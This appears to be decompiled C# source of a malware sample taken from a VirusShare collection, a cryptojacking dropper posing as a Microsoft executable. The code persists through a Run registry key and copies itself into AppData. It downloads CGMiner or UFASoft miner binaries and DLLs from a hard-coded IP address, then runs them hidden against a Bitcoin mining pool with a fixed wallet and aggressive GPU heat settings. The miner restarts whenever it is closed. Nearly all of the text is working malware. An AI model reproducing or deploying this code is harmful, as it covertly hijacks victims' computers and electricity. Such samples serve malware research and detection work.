// Decompiled with JetBrains decompiler
// Type: Form3
// Assembly: Microsoft, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 52DE2D4F-2FC9-4E23-A6DB-0527397D33BC
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\Trojan-Ransom.Win32.Blocker.bnug-963ac59dc4d219573855c4c25eb32bb98e80d3c0e24e1dda4c8889393c30bbdb.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using My;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Threading;

[StandardModule]
public sealed class Form3
{
  private static WebClient WebClient1 = new WebClient();
  private static Process MiningProcess = new Process();

  [DllImport("kernel32", EntryPoint = "GetModuleFileNameA", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern int GetModuleFileName(int hModule, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpFileName, int nSize);

  [DllImport("kernel32", EntryPoint = "MoveFileExW", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern int MoveFile([MarshalAs(UnmanagedType.LPTStr), In] string lpExistingFileName, [MarshalAs(UnmanagedType.LPTStr), In] string lpNewFileName, long dwFlags);

  [STAThread]
  public static void Main()
  {
    string name = "goblmah371z";
    Mutex mutex;
    try
    {
      mutex = Mutex.OpenExisting(name);
      Environment.Exit(0);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      mutex = new Mutex(true, name);
      ProjectData.ClearProjectError();
    }
    try
    {
      if (!Directory.Exists(Interaction.Environ("appdata") + "\\"))
        Form3.LockAndHideFolder(Interaction.Environ("appdata") + "\\");
      MyProject.Computer.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue("audio", (object) (Interaction.Environ("appdata") + "\\\\Microsoft.exe"));
      if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\\\Microsoft.exe"))
      {
        string fileName1 = Process.GetCurrentProcess().MainModule.FileName;
        string fileName2 = Process.GetCurrentProcess().MainModule.FileName;
        int moduleFileName = Form3.GetModuleFileName(0, ref fileName2, 256);
        Form3.MoveFile(Strings.LSet(fileName1, moduleFileName), Interaction.Environ("appdata") + "\\\\Microsoft.exe", 8L);
      }
      string path = Interaction.Environ("windir") + "\\System32\\OpenCL.DLL";
      DirectoryInfo directoryInfo = new DirectoryInfo(path);
      if (System.IO.File.Exists(path))
      {
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\\\CGMiner.exe"))
          Form3.WebClient1.DownloadFile("http://198.23.167.160/sov1001/CGMiner.exe", Interaction.Environ("appdata") + "\\\\CGMiner.exe");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\\\diablo130302.cl"))
          Form3.WebClient1.DownloadFile("http://198.23.167.160/sov1001/diablo130302.cl", Interaction.Environ("appdata") + "\\\\diablo130302.cl");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\\\diakgcn121016.cl"))
          Form3.WebClient1.DownloadFile("http://198.23.167.160/sov1001/diakgcn121016.cl", Interaction.Environ("appdata") + "\\\\diakgcn121016.cl");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\\\libeay32.dll"))
          Form3.WebClient1.DownloadFile("http://198.23.167.160/sov1001/libeay32.dll", Interaction.Environ("appdata") + "\\\\libeay32.dll");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\\\libidn-11.dll"))
          Form3.WebClient1.DownloadFile("http://198.23.167.160/sov1001/libidn-11.dll", Interaction.Environ("appdata") + "\\\\libidn-11.dll");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\\\libpdcurses.dll"))
          Form3.WebClient1.DownloadFile("http://198.23.167.160/sov1001/libpdcurses.dll", Interaction.Environ("appdata") + "\\\\libpdcurses.dll");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\\\phatk121016.cl"))
          Form3.WebClient1.DownloadFile("http://198.23.167.160/sov1001/phatk121016.cl", Interaction.Environ("appdata") + "\\\\phatk121016.cl");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\\\poclbm130302.cl"))
          Form3.WebClient1.DownloadFile("http://198.23.167.160/sov1001/poclbm130302.cl", Interaction.Environ("appdata") + "\\\\poclbm130302.cl");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\\\libcurl.dll"))
          Form3.WebClient1.DownloadFile("http://198.23.167.160/sov1001/libcurl.dll", Interaction.Environ("appdata") + "\\\\libcurl.dll");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\\\pthreadGC2.dll"))
          Form3.WebClient1.DownloadFile("http://198.23.167.160/sov1001/pthreadGC2.dll", Interaction.Environ("appdata") + "\\\\pthreadGC2.dll");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\\\scrypt130511.cl"))
          Form3.WebClient1.DownloadFile("http://198.23.167.160/sov1001/scrypt130511.cl", Interaction.Environ("appdata") + "\\\\scrypt130511.cl");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\\\ssleay32.dll"))
          Form3.WebClient1.DownloadFile("http://198.23.167.160/sov1001/ssleay32.dll", Interaction.Environ("appdata") + "\\\\ssleay32.dll");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\\\zlib1.dll"))
          Form3.WebClient1.DownloadFile("http://198.23.167.160/sov1001/zlib1.dll", Interaction.Environ("appdata") + "\\\\zlib1.dll");
        Thread.Sleep(3009);
        ProcessStartInfo startInfo = Form3.MiningProcess.StartInfo;
        startInfo.FileName = Interaction.Environ("appdata") + "\\\\CGMiner.exe";
        startInfo.CreateNoWindow = true;
        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
        startInfo.Arguments = "-o stratum.mining.eligius.st:3334 -u 1GNkSveZTxiqrPX3HhD3Wk2c1iw2hVMTwr -p xxxx --auto-fan --auto-gpu --gpu-threads 2 --gpu-fan 99 --temp-target 100 --temp-overheat 110 --no-submit-stale";
      }
      else
      {
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\\\UFASoft.exe"))
          Form3.WebClient1.DownloadFile("http://198.23.167.160/sov1001/coin-miner.exe", Interaction.Environ("appdata") + "\\\\UFASoft.exe");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\\\bdb.dll"))
          Form3.WebClient1.DownloadFile("http://198.23.167.160/sov1001/bdb.dll", Interaction.Environ("appdata") + "\\\\bdb.dll");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\\\btc.il"))
          Form3.WebClient1.DownloadFile("http://198.23.167.160/sov1001/btc.il", Interaction.Environ("appdata") + "\\\\btc.il");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\\\btc-evergreen.il"))
          Form3.WebClient1.DownloadFile("http://198.23.167.160/sov1001/btc-evergreen.il", Interaction.Environ("appdata") + "\\\\btc-evergreen.il");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\\\coinutil.dll"))
          Form3.WebClient1.DownloadFile("http://198.23.167.160/sov1001/coinutil.dll", Interaction.Environ("appdata") + "\\\\coinutil.dll");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\\\miner.dll"))
          Form3.WebClient1.DownloadFile("http://198.23.167.160/sov1001/miner.dll", Interaction.Environ("appdata") + "\\\\miner.dll");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\\\phatk.cl"))
          Form3.WebClient1.DownloadFile("http://198.23.167.160/sov1001/phatk.cl", Interaction.Environ("appdata") + "\\\\phatk.cl");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\\\phatk.ptx"))
          Form3.WebClient1.DownloadFile("http://198.23.167.160/sov1001/phatk.ptx", Interaction.Environ("appdata") + "\\\\phatk.ptx");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\\\usft_ext.dll"))
          Form3.WebClient1.DownloadFile("http://198.23.167.160/sov1001/usft_ext.dll", Interaction.Environ("appdata") + "\\\\usft_ext.dll");
        Thread.Sleep(3009);
        ProcessStartInfo startInfo = Form3.MiningProcess.StartInfo;
        startInfo.FileName = Interaction.Environ("appdata") + "\\\\UFASoft.exe";
        startInfo.CreateNoWindow = true;
        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
        startInfo.Arguments = "-a sha256 -g no -o stratum.mining.eligius.st:3334 -u 1GNkSveZTxiqrPX3HhD3Wk2c1iw2hVMTwr -p xxxx -t 2";
      }
      Form3.MiningProcess.Start();
      Form3.MiningProcess.EnableRaisingEvents = true;
      Form3.MiningProcess.Exited += new EventHandler(Form3.MiningProcessClosed);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      int num = (int) Interaction.MsgBox((object) ex);
      ProjectData.ClearProjectError();
    }
    while (true)
      Thread.Sleep(3009);
  }

  public static void MiningProcessClosed(object sender, EventArgs e) => Form3.MiningProcess.Start();

  public static bool LockAndHideFolder(string path)
  {
    string name = WindowsIdentity.GetCurrent().Name;
    FileSystemAccessRule rule1 = new FileSystemAccessRule("Administrators", FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Allow);
    FileSystemAccessRule rule2 = new FileSystemAccessRule(name, FileSystemRights.DeleteSubdirectoriesAndFiles | FileSystemRights.Delete, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny);
    FileSystemAccessRule rule3 = new FileSystemAccessRule(name, FileSystemRights.Modify, InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Allow);
    DirectorySecurity directorySecurity = new DirectorySecurity();
    directorySecurity.AddAccessRule(rule1);
    directorySecurity.AddAccessRule(rule3);
    directorySecurity.AddAccessRule(rule2);
    bool flag;
    try
    {
      Process process = new Process();
      Directory.CreateDirectory(path, directorySecurity);
      process.StartInfo = new ProcessStartInfo()
      {
        WindowStyle = ProcessWindowStyle.Hidden,
        FileName = "CMD.exe",
        Arguments = "/C attrib -s -h " + Convert.ToString(path)
      };
      process.Start();
      flag = true;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      flag = false;
      ProjectData.ClearProjectError();
    }
    return flag;
  }
}
